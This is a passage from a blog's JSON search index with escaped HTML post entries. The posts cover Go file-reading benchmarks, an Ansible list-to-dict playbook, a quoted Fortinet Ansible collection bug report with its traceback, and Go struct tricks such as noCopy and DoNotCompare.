style=\"display:flex;\"\u003e\u003cspan\u003eBenchmarkReadChunk4GB-8                \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e        \u003cspan style=\"color:#ae81ff\"\u003e2095515009\u003c/span\u003e ns/op\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eBenchmarkReadChunk16GB-8               \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e        \u003cspan style=\"color:#ae81ff\"\u003e8547054349\u003c/span\u003e ns/op\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e在本文的测试条件下（每行数据 1KB），对于小对象 4KB 的读取，三种方式差距并不大；在 MB 级别的读取中，直接加载最快，但块读取也慢不了多少；上了 GB 后，块读取方式会最快。\u003c/p\u003e","tags":["URL","Go"],"title":"怎么选择 Go 文件读取方案"},{"categories":["URL","Ansible"],"contents":" 將 List 轉置為 dict 的 list list my_users: - aaa - bbb - ccc dict my_users: - Name: aaa - Name: bbb - Name: ccc playbook - name: Transform data vars: orig_users: - aaa - bbb - ccc my_users: [] set_fact: my_users: \u0026#34;{{ my_users + [{} | combine({\u0026#39;Name\u0026#39;: item})] }}\u0026#34; loop: \u0026#34;{{ orig_users }}\u0026#34; 說明如下：\n利用 combine 這個 filter 來組出 dict 利用 loop 去 iterate orig_users 用 my_users + [{} | combine({\u0026lsquo;Name\u0026rsquo;: item})] 來做 List append``` ","date":"March 9, 2022","hero":"/images/hero/ansible.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20220309-how-to-transform-list-to-object-list/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://ansible.cloudns.pro/post/how-to-transform-list-to-object-list/\" target=\"_blank\" rel=\"noopener\"\u003e將 List 轉置為 dict 的 list\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"list\"\u003elist\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003emy_users\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  - \u003cspan style=\"color:#ae81ff\"\u003eaaa\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  - \u003cspan style=\"color:#ae81ff\"\u003ebbb\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  - \u003cspan style=\"color:#ae81ff\"\u003eccc\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"dict\"\u003edict\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003emy_users\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  - \u003cspan style=\"color:#f92672\"\u003eName\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eaaa\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  - \u003cspan style=\"color:#f92672\"\u003eName\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003ebbb\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  - \u003cspan style=\"color:#f92672\"\u003eName\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eccc\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"playbook\"\u003eplaybook\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e- \u003cspan style=\"color:#f92672\"\u003ename\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eTransform data\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003evars\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eorig_users\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eaaa\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003ebbb\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eccc\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003emy_users\u003c/span\u003e: []\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003eset_fact\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003emy_users\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;{{ my_users + [{} | combine({\u0026#39;Name\u0026#39;: item})] }}\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003eloop\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;{{ orig_users }}\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e說明如下：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e利用 combine 這個 filter 來組出 dict\u003c/li\u003e\n\u003cli\u003e利用 loop 去 iterate orig_users\u003c/li\u003e\n\u003cli\u003e用 my_users + [{} | combine({\u0026lsquo;Name\u0026rsquo;: item})] 來做 List append```\u003c/li\u003e\n\u003c/ol\u003e","tags":["URL","Ansible"],"title":"將 List 轉置為 dict 的 list"},{"categories":["URL","Ansible","Fortinet"],"contents":" Misspelling, missing collection, or incorrect module path for fortios_system_config_backup_restore issue Hi,\nI\u0026rsquo;m trying to retrieve the configuration from a Fortigate using the module fortios_system_config_backup_restore and basing on your playbook example.\nI have ansible 2.10.6.\nWhen I use the collection fortinet.fortios:1.1.8, I got the following error: missing 1 required positional argument: 'mod'\nThe full traceback is: Traceback (most recent call last): File \u0026#34;/home/ansible/.ansible/tmp/ansible-local-8668osvgufxk/ansible-tmp-1615481963.0092971-8768-3877705280026/AnsiballZ_fortios_system_config_backup_restore.py\u0026#34;, line 102, in \u0026lt;module\u0026gt; _ansiballz_main() File \u0026#34;/home/ansible/.ansible/tmp/ansible-local-8668osvgufxk/ansible-tmp-1615481963.0092971-8768-3877705280026/AnsiballZ_fortios_system_config_backup_restore.py\u0026#34;, line 94, in _ansiballz_main invoke_module(zipped_mod, temp_path, ANSIBALLZ_PARAMS) File \u0026#34;/home/ansible/.ansible/tmp/ansible-local-8668osvgufxk/ansible-tmp-1615481963.0092971-8768-3877705280026/AnsiballZ_fortios_system_config_backup_restore.py\u0026#34;, line 40, in invoke_module runpy.run_module(mod_name=\u0026#39;ansible_collections.fortinet.fortios.plugins.modules.fortios_system_config_backup_restore\u0026#39;, init_globals=None, run_name=\u0026#39;__main__\u0026#39;, alter_sys=True) File \u0026#34;/usr/lib/python3.8/runpy.py\u0026#34;, line 207, in run_module return _run_module_code(code, init_globals, run_name, mod_spec) File \u0026#34;/usr/lib/python3.8/runpy.py\u0026#34;, line 97, in _run_module_code _run_code(code, mod_globals, init_globals, File \u0026#34;/usr/lib/python3.8/runpy.py\u0026#34;, line 87, in _run_code exec(code, run_globals) File \u0026#34;/tmp/ansible_fortinet.fortios.fortios_system_config_backup_restore_payload_mplamrs7/ansible_fortinet.fortios.fortios_system_config_backup_restore_payload.zip/ansible_collections/fortinet/fortios/plugins/modules/fortios_system_config_backup_restore.py\u0026#34;, line 472, in \u0026lt;module\u0026gt; File \u0026#34;/tmp/ansible_fortinet.fortios.fortios_system_config_backup_restore_payload_mplamrs7/ansible_fortinet.fortios.fortios_system_config_backup_restore_payload.zip/ansible_collections/fortinet/fortios/plugins/modules/fortios_system_config_backup_restore.py\u0026#34;, line 436, in main TypeError: __init__() missing 1 required positional argument: \u0026#39;mod\u0026#39; fatal: [fortigate-01]: FAILED! =\u0026gt; { \u0026#34;changed\u0026#34;: false, \u0026#34;module_stderr\u0026#34;: \u0026#34;Traceback (most recent call last):\\n File \\\u0026#34;/home/ansible/.ansible/tmp/ansible-local-8668osvgufxk/ansible-tmp-1615481963.0092971-8768-3877705280026/AnsiballZ_fortios_system_config_backup_restore.py\\\u0026#34;, line 102, in \u0026lt;module\u0026gt;\\n _ansiballz_main()\\n File \\\u0026#34;/home/ansible/.ansible/tmp/ansible-local-8668osvgufxk/ansible-tmp-1615481963.0092971-8768-3877705280026/AnsiballZ_fortios_system_config_backup_restore.py\\\u0026#34;, line 94, in _ansiballz_main\\n invoke_module(zipped_mod, temp_path, ANSIBALLZ_PARAMS)\\n File \\\u0026#34;/home/ansible/.ansible/tmp/ansible-local-8668osvgufxk/ansible-tmp-1615481963.0092971-8768-3877705280026/AnsiballZ_fortios_system_config_backup_restore.py\\\u0026#34;, line 40, in invoke_module\\n runpy.run_module(mod_name=\u0026#39;ansible_collections.fortinet.fortios.plugins.modules.fortios_system_config_backup_restore\u0026#39;, init_globals=None, run_name=\u0026#39;__main__\u0026#39;, alter_sys=True)\\n File \\\u0026#34;/usr/lib/python3.8/runpy.py\\\u0026#34;, line 207, in run_module\\n return _run_module_code(code, init_globals, run_name, mod_spec)\\n File \\\u0026#34;/usr/lib/python3.8/runpy.py\\\u0026#34;, line 97, in _run_module_code\\n _run_code(code, mod_globals, init_globals,\\n File \\\u0026#34;/usr/lib/python3.8/runpy.py\\\u0026#34;, line 87, in _run_code\\n exec(code, run_globals)\\n File \\\u0026#34;/tmp/ansible_fortinet.fortios.fortios_system_config_backup_restore_payload_mplamrs7/ansible_fortinet.fortios.fortios_system_config_backup_restore_payload.zip/ansible_collections/fortinet/fortios/plugins/modules/fortios_system_config_backup_restore.py\\\u0026#34;, line 472, in \u0026lt;module\u0026gt;\\n File \\\u0026#34;/tmp/ansible_fortinet.fortios.fortios_system_config_backup_restore_payload_mplamrs7/ansible_fortinet.fortios.fortios_system_config_backup_restore_payload.zip/ansible_collections/fortinet/fortios/plugins/modules/fortios_system_config_backup_restore.py\\\u0026#34;, line 436, in main\\nTypeError: __init__() missing 1 required positional argument: \u0026#39;mod\u0026#39;\\n\u0026#34;, \u0026#34;module_stdout\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;msg\u0026#34;: \u0026#34;MODULE FAILURE\\nSee stdout/stderr for the exact error\u0026#34;, \u0026#34;rc\u0026#34;: 1 } Using the recent pre release fortinet.fortios:2.0.0 , I got:\nERROR! couldn\u0026#39;t resolve module/action \u0026#39;fortinet.fortios.fortios_system_config_backup_restore\u0026#39;. This often indicates a misspelling, missing collection, or incorrect module path. The error appears to be in \u0026#39;/home/ansible/backup.yml\u0026#39;: line 46, column 7, but may be elsewhere in the file depending on the exact syntax problem. The offending line appears to be: tasks: - name: backup global or a_specific_vdom settings No module found in ~/.ansible/collections/ansible_collections/fortinet/fortios/plugins/modules/\nuse 1.1.9 ","date":"January 6, 2022","hero":"/images/hero/ansible.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20220106-ansible-galaxy-fortios-collection/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/fortinet-ansible-dev/ansible-galaxy-fortios-collection/issues/95\" target=\"_blank\" rel=\"noopener\"\u003eMisspelling, missing collection, or incorrect module path for fortios_system_config_backup_restore\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"issue\"\u003eissue\u003c/h4\u003e\n\u003cp\u003eHi,\u003c/p\u003e\n\u003cp\u003eI\u0026rsquo;m trying to retrieve the configuration from a Fortigate using the module \u003ccode\u003efortios_system_config_backup_restore\u003c/code\u003e and basing on your playbook example.\u003c/p\u003e\n\u003cp\u003eI have \u003ccode\u003eansible 2.10.6\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eWhen I use the collection \u003ccode\u003efortinet.fortios:1.1.8\u003c/code\u003e, I got the following error: \u003ccode\u003emissing 1 required positional argument: 'mod'\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eThe full traceback is:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eTraceback \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003emost recent call last\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  File \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/home/ansible/.ansible/tmp/ansible-local-8668osvgufxk/ansible-tmp-1615481963.0092971-8768-3877705280026/AnsiballZ_fortios_system_config_backup_restore.py\u0026#34;\u003c/span\u003e, line 102, in \u0026lt;module\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    _ansiballz_main\u003cspan style=\"color:#f92672\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  File \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/home/ansible/.ansible/tmp/ansible-local-8668osvgufxk/ansible-tmp-1615481963.0092971-8768-3877705280026/AnsiballZ_fortios_system_config_backup_restore.py\u0026#34;\u003c/span\u003e, line 94, in _ansiballz_main\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    invoke_module\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003ezipped_mod, temp_path, ANSIBALLZ_PARAMS\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  File \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/home/ansible/.ansible/tmp/ansible-local-8668osvgufxk/ansible-tmp-1615481963.0092971-8768-3877705280026/AnsiballZ_fortios_system_config_backup_restore.py\u0026#34;\u003c/span\u003e, line 40, in invoke_module\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    runpy.run_module\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003emod_name\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ansible_collections.fortinet.fortios.plugins.modules.fortios_system_config_backup_restore\u0026#39;\u003c/span\u003e, init_globals\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eNone, run_name\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;__main__\u0026#39;\u003c/span\u003e, alter_sys\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eTrue\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  File \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/usr/lib/python3.8/runpy.py\u0026#34;\u003c/span\u003e, line 207, in run_module\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e _run_module_code\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003ecode, init_globals, run_name, mod_spec\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  File \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/usr/lib/python3.8/runpy.py\u0026#34;\u003c/span\u003e, line 97, in _run_module_code\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    _run_code\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003ecode, mod_globals, init_globals,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  File \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/usr/lib/python3.8/runpy.py\u0026#34;\u003c/span\u003e, line 87, in _run_code\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    exec\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003ecode, run_globals\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  File \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/tmp/ansible_fortinet.fortios.fortios_system_config_backup_restore_payload_mplamrs7/ansible_fortinet.fortios.fortios_system_config_backup_restore_payload.zip/ansible_collections/fortinet/fortios/plugins/modules/fortios_system_config_backup_restore.py\u0026#34;\u003c/span\u003e, line 472, in \u0026lt;module\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  File \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/tmp/ansible_fortinet.fortios.fortios_system_config_backup_restore_payload_mplamrs7/ansible_fortinet.fortios.fortios_system_config_backup_restore_payload.zip/ansible_collections/fortinet/fortios/plugins/modules/fortios_system_config_backup_restore.py\u0026#34;\u003c/span\u003e, line 436, in main\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eTypeError: __init__\u003cspan style=\"color:#f92672\"\u003e()\u003c/span\u003e missing \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e required positional argument: \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;mod\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003efatal: \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003efortigate-01\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e: FAILED! \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;changed\u0026#34;\u003c/span\u003e: false,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;module_stderr\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Traceback (most recent call last):\\n  File \\\u0026#34;/home/ansible/.ansible/tmp/ansible-local-8668osvgufxk/ansible-tmp-1615481963.0092971-8768-3877705280026/AnsiballZ_fortios_system_config_backup_restore.py\\\u0026#34;, line 102, in \u0026lt;module\u0026gt;\\n    _ansiballz_main()\\n  File \\\u0026#34;/home/ansible/.ansible/tmp/ansible-local-8668osvgufxk/ansible-tmp-1615481963.0092971-8768-3877705280026/AnsiballZ_fortios_system_config_backup_restore.py\\\u0026#34;, line 94, in _ansiballz_main\\n    invoke_module(zipped_mod, temp_path, ANSIBALLZ_PARAMS)\\n  File \\\u0026#34;/home/ansible/.ansible/tmp/ansible-local-8668osvgufxk/ansible-tmp-1615481963.0092971-8768-3877705280026/AnsiballZ_fortios_system_config_backup_restore.py\\\u0026#34;, line 40, in invoke_module\\n    runpy.run_module(mod_name=\u0026#39;ansible_collections.fortinet.fortios.plugins.modules.fortios_system_config_backup_restore\u0026#39;, init_globals=None, run_name=\u0026#39;__main__\u0026#39;, alter_sys=True)\\n  File \\\u0026#34;/usr/lib/python3.8/runpy.py\\\u0026#34;, line 207, in run_module\\n    return _run_module_code(code, init_globals, run_name, mod_spec)\\n  File \\\u0026#34;/usr/lib/python3.8/runpy.py\\\u0026#34;, line 97, in _run_module_code\\n    _run_code(code, mod_globals, init_globals,\\n  File \\\u0026#34;/usr/lib/python3.8/runpy.py\\\u0026#34;, line 87, in _run_code\\n    exec(code, run_globals)\\n  File \\\u0026#34;/tmp/ansible_fortinet.fortios.fortios_system_config_backup_restore_payload_mplamrs7/ansible_fortinet.fortios.fortios_system_config_backup_restore_payload.zip/ansible_collections/fortinet/fortios/plugins/modules/fortios_system_config_backup_restore.py\\\u0026#34;, line 472, in \u0026lt;module\u0026gt;\\n  File \\\u0026#34;/tmp/ansible_fortinet.fortios.fortios_system_config_backup_restore_payload_mplamrs7/ansible_fortinet.fortios.fortios_system_config_backup_restore_payload.zip/ansible_collections/fortinet/fortios/plugins/modules/fortios_system_config_backup_restore.py\\\u0026#34;, line 436, in main\\nTypeError: __init__() missing 1 required positional argument: \u0026#39;mod\u0026#39;\\n\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;module_stdout\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;msg\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;MODULE FAILURE\\nSee stdout/stderr for the exact error\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;rc\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eUsing the recent pre release \u003ccode\u003efortinet.fortios:2.0.0\u003c/code\u003e , I got:\u003c/p\u003e","tags":["URL","Ansible","Fortinet"],"title":"Misspelling, missing collection, or incorrect module path for fortios_system_config_backup_restore"},{"categories":["URL","Go"],"contents":" Gopher 需要知道的几个结构体骚操作 NoCopy $ go vet aaa.go # command-line-arguments ./aaa.go:7:14: test passes lock by value: sync.WaitGroup contains sync.noCopy ./aaa.go:15:10: call of test copies lock value: sync.WaitGroup contains sync.noCopy type noCopy struct{} type WaitGroup struct { noCopy noCopy // 64-bit value: high 32 bits are counter, low 32 bits are waiter count. // 64-bit atomic operations require 64-bit alignment, but 32-bit // compilers only guarantee that 64-bit fields are 32-bit aligned. // For this reason on 32 bit architectures we need to check in state() // if state1 is aligned or not, and dynamically \u0026#34;swap\u0026#34; the field order if // needed. state1 uint64 state2 uint32 } noCopy 定义非常简单，空结构体，zero size 不占用空间(前提是非结构体的最后一个字段，否则还要是有 8 byte 空间开销)\nsync.WaitGroup 内嵌 noCopy 字段，防止 Cond 变量被复制\n上面是 sync.WaitGroup 结构体的定义，同时注意 noCopy 是源码中不可导出的定义。如果用户代码也想实现 NoCopy 呢？可以参考 grpc DoNotCopy\n// DoNotCopy can be embedded in a struct to help prevent shallow copies. // This does not rely on a Go language feature, but rather a special case // within the vet checker. type DoNotCopy [0]sync.Mutex 非常简单，Mutex 零长数组，不占用空间。由于 vet checker 会检测 Mutex，相当于替我们实现了 noCopy 功能\nDoNotCompare 对于 struct 来讲，只有所有字段全部 comparable 的(不限大小写是否导出)，那么结构体才可以比较。同时只比较 non-blank 的字段\nSlice, Map, Function 均是不可比较的，只与判断是否为 nil. 所以我们可以利用这两个特性，内嵌函数来实现不可比较，参考 protobuf DoNotCompare\n// DoNotCompare can be embedded in a struct to prevent comparability. type DoNotCompare [0]func() ","date":"January 3, 2022","hero":"/images/hero/go.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20220103-some-struct-notes/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://mp.weixin.qq.com/s/A4m1xlFwh9pD0qy3p7ItSA\" target=\"_blank\" rel=\"noopener\"\u003eGopher 需要知道的几个结构体骚操作\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"nocopy\"\u003eNoCopy\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ go vet aaa.go\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# command-line-arguments\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e./aaa.go:7:14: test passes lock by value: sync.WaitGroup contains sync.noCopy\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e./aaa.go:15:10: call of test copies lock value: sync.WaitGroup contains sync.noCopy\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003enoCopy\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estruct\u003c/span\u003e{}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eWaitGroup\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estruct\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e \u003cspan style=\"color:#a6e22e\"\u003enoCopy\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003enoCopy\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e \u003cspan style=\"color:#75715e\"\u003e// 64-bit value: high 32 bits are counter, low 32 bits are waiter count.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e \u003cspan style=\"color:#75715e\"\u003e// 64-bit atomic operations require 64-bit alignment, but 32-bit\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e \u003cspan style=\"color:#75715e\"\u003e// compilers only guarantee that 64-bit fields are 32-bit aligned.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e \u003cspan style=\"color:#75715e\"\u003e// For this reason on 32 bit architectures we need to check in state()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e \u003cspan style=\"color:#75715e\"\u003e// if state1 is aligned or not, and dynamically \u0026#34;swap\u0026#34; the field order 